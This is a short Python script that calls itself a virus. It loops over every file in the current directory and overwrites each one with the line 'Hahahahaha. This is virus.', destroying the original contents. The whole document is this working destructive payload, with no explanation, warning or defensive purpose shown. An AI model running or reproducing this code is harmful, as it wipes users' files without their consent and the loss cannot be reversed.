from glob import glob

for file in glob("*"):
    with open(file, "w+") as f:
        f.write("Hahahahaha. This is virus.")